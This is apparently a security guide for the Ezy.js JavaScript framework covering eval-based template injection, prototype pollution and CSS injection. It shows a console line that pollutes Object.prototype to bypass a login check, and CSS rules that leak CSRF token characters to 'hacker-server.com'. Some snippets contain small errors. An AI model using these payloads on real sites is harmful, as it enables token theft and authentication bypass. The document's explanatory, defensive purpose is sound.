# Ezy.js - security concerns
To ensure the highest security, and the best digital experience, relying on any framework, no matter is front-end or back-end, big or small, is not advisable.

## Table of Contents
- [Template Injection](#template-injection)
- [Prototype Pollution](#prototype-pollution)
- [CSS Injection](#css-injection)

## Template Injection
Problem of the most is template injection:
```JavaScript
// It generates a closure function
// Example 1:
eval(`generateRedirection(\`${domain}${location}\`)`)();
// or return cleaning method, which is example 2:
function popup(msg){
    // dom actions...
    return eval(`(${msg})=>{parent.remove();${exp}}`);// while the `exp` is related to the msg, like the implementation of render.evaluateExpression,
    // which is trying to act as scoped eval
}
```
Anyways, if the `location` is polluted to `${evilJavaScript()}`, it will be executed.
So we suggest rewrite to this:
```JavaScript
/**
 * @param {function(any):void} func
 * @param {any[]} args
 */
function template(func,...args){
    return func(...args);
}
template(generateRedirection,`${domain}${location}`);
```
This is much safer.

## Prototype Pollution
To ensure performance, JavaScript use `prototype` to avoid copying static methods:
```JavaScript
const a="hello";
console.log(a.repeat(5));// This is calling String.prototype.repeat, 
// instead of copying the `repeat` method every time when a string is created.
```
But that causes problem:
```JavaScript
// Injection point
const obj={};// It is somehow ensured to be unreachable
if (passwordVerify(psw,hash)){
    obj.admin=true;
}
// ... meanwhile, no one touches obj
if (obj.admin){
    redirect2("admin.php",{passed:someUnreachableToken});
}
```
If somebody injected in the console before clicking login:
```JavaScript
> Object.prototype.admin=true;
```
Then it logins! It's because if JavaScript is unable to find an attribute of an object, it will try it on `prototype`(the root of all the evil)
So we suggested to use our library (or any other ways or library etc., just ensure it's safe enough)
```JavaScript
import {createSafeObject} from "./safety.js";
const obj=createSafeObject(obj);
// ...
```
Our method won't ensure that the prototype cannot be polluted, but when you tries to access any `prototype` attribute, it will throw an Error.
Moreover, to be more secured, we actually copy the functions at the very first, in case they're polluted, too:
```JavaScript
const safeHasOwn = Object.hasOwn,
    safeHasOwnProperty = Object.prototype.hasOwnProperty;
/* eslint-disable no-undef */
import { log } from "./main.js";
// ...
```
But please be ***EXTREMELY*** careful to use that method, since it will block ALL the prototype attributes, like `toString`, `valueOf`, etc.
Of course, if you want to handcheck it in vulnerable points, you can use this(though it will be very annoying to type it manually):
```JavaScript
import {getPropertySafe} from "./safety.js";
// ...
if (getPropertySafe(
    obj,
    "admin",
    true // whether should the function throw error when it's a prototype attribute, or not.
    // true = don't throw
    // false = throw
    )
){
    // ...
}
```

## CSS Injection
As we have these CSS Selectors:
- `[href^="a"]` means element that has attribute `href` starts with `a`.
- `[href*="a"]` means element that has attribute `href` contains `a`.
- `[href$="a"]` means element that has attribute `href` ends with `a`.

Therefore, we can fetch [csrf tokens](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF#csrf_tokens) or passwords via injected CSS:
```CSS
form:has(input[name="csrf"][value^="a"]){
    background-image: url("hacker-server.com?csrf=a");
}
form:has(input[name="csrf"][value^="b"]){
    background-image: url("hacker-server.com?csrf=b");
}
form:has(input[name="csrf"][value^="c"]){
    background-image: url("hacker-server.com?csrf=c");
}
...
```
Moreover, if you can automatically update the CSS without reload the page:
```CSS
/* We assumed that your server gets the "hacker-server.com?csrf=a" request */
form:has(input[name="csrf"][value^="aa"]){
    background-image: url("hacker-server.com?csrf=aa");
}
form:has(input[name="csrf"][value^="ab"]){
    background-image: url("hacker-server.com?csrf=ab");
}
form:has(input[name="csrf"][value^="ac"]){
    background-image: url("hacker-server.com?csrf=ac");
}
...
```
But again, that might seems too slow in the vision of the hackers, and may of the times, hackers don't know what characters it has. So they may also attack via `@font-face` modifier:
```CSS
@font-face{
    font-family:"font-1";
    src: url("hacker-server.com?csrf=a");
    unicode-range: U+61;/* means "a" */
}
@font-face{
    font-family:"font-2";
    src: url("hacker-server.com?csrf=b");
    unicode-range: U+62;/* means "a" */
}
@font-face{
    font-family:"font-3";
    src: url("hacker-server.com?csrf=c");
    unicode-range: U+63;/* means "a" */
}
...
input[name="cstf"]{
    font-family: font-1 font-2 font-3;
}
```
So the hacker can get what characters it has.

Therefore, we suggested that developers should never allows custom CSS or variable CSS. Use the `secure.createBlankObject` to avoid prototype pollution if you want to use the `CO.style` syntax.
